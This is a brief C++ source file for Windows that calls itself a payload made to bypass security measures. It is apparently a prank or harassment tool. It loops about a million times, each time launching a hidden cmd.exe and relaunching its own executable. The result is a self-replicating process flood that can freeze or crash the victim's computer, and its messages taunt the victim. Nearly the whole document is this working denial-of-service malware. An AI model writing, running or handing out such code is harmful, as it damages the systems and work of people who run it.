
/* (c) All Rights Reserved, Dashies Software Inc. */

/* this payload has been made to bypass security measurements and be as effective as it is supposed to be. */

#include "stdafx.h"

#include<windows.h>
#include<iostream>
#include<string>

using namespace std;
std::string Host = "";

int main(int length, char ** argument) {
	std::cout << "* oops, seems like a pony has seen you hater!" << std::endl;

	Host = argument[0];

	for(int index = 0; index <= 999999; index += 1) {
		ShellExecute(NULL, "open", "C:\\Windows\\System32\\cmd.exe", NULL, NULL, SW_HIDE);
		ShellExecute(NULL, "open", Host.c_str(), NULL, NULL, SW_SHOW);
	}

	std::cout << "* anyweh, enjoy da waey my fellaw!" << std::endl;
	return 0;
}